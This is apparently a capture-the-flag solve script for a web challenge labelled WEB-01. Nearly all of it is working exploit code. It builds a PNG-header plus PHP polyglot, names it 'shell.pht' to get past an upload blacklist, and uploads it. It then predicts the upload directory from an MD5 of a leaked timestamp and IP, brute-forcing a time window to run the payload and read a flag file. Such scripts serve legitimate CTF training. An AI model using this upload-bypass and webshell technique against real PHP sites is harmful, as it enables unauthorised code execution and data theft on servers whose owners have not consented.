#!/usr/bin/env python3
"""
WEB-01 Solve Script: Polyglot File Upload (.pht Bypass)
1. Craft a polyglot file (PNG header + PHP webshell)
2. Fetch hidden timestamp and IP from index.php
3. Upload the polyglot
4. Calculate directory hash: md5(timestamp + ip)[:8]
5. Access the uploaded file to retrieve the flag
"""

import requests
import hashlib
import re
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"

print(f"[*] Target: {TARGET}")

# ── Step 1: Craft Polyglot ──
print("[*] Step 1: Crafting PNG+PHP polyglot...")
# Valid PNG signature
png_header = b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
# PHP payload to read flag
php_payload = b"<?php echo file_get_contents('/var/www/flags/web01/flag.txt'); ?>"
# Combine them
polyglot = png_header + php_payload
filename = "shell.pht" # .pht extension bypasses blacklist

print(f"[+] Polyglot crafted ({len(polyglot)} bytes)")

# ── Step 2: Extract Hidden Info ──
print("[*] Step 2: Fetching hidden timestamp and IP...")
try:
    s = requests.Session()
    r = s.get(f"{TARGET}/index.php")
    
    # Extract hidden comment: <!-- Server Time: 1771234567 | Client IP: 127.0.0.1 -->
    match = re.search(r'Server Time:\s*(\d+)\s*\|\s*Client IP:\s*([0-9.]+)', r.text)
    if not match:
        print("[-] Could not find hidden timestamp/IP in index.php")
        sys.exit(1)
        
    server_time = int(match.group(1))
    client_ip = match.group(2)
    print(f"[+] Server Time: {server_time}")
    print(f"[+] Client IP: {client_ip}")

except Exception as e:
    print(f"[-] Error extracting info: {e}")
    sys.exit(1)

# ── Step 3: Upload File ──
print("[*] Step 3: Uploading polyglot...")

files = {
    'profile_pic': (filename, polyglot, 'image/png')
}

# Important: The server calculates hash based on time() *during* the upload.
# Since we just fetched the time, the upload time might differ by a few seconds.
# We'll calculate a range of possible hashes.
upload_start_time = server_time
r = s.post(f"{TARGET}/upload.php", files=files)

if "File uploaded successfully" in r.text or r.status_code == 200:
    print("[+] Upload successful!")
else:
    print("[-] Upload failed.")
    sys.exit(1)

# ── Step 4: Predict Path & Retrieve Flag ──
print("[*] Step 4: Brute-forcing time window for correct path...")

# Try a small window around the fetched server time (e.g., -2 to +5 seconds)
# The server time we grabbed was *before* the upload, so actual time is >= fetched time.
found_flag = False

for drift in range(0, 10):
    timestamp = upload_start_time + drift
    # Calculate hash: md5(timestamp + ip)[:8]
    raw = f"{timestamp}{client_ip}"
    directory = hashlib.md5(raw.encode()).hexdigest()[:8]
    
    url = f"{TARGET}/uploads/{directory}/{filename}"
    # print(f"    Checking: {url} (ts={timestamp})")
    
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            print(f"[+] Found shell at: {url}")
            if "FLAG{" in r.text:
                flag = re.search(r'(FLAG\{[^}]+\})', r.text).group(1)
                print(f"\n[+] FLAG CAPTURED: {flag}")
                found_flag = True
                break
            else:
                print(f"[-] Shell found but no flag? Response: {r.text[:50]}...")
    except:
        pass

if not found_flag:
    print("[-] Could not find the uploaded shell. Is the time window too small?")
    sys.exit(1)
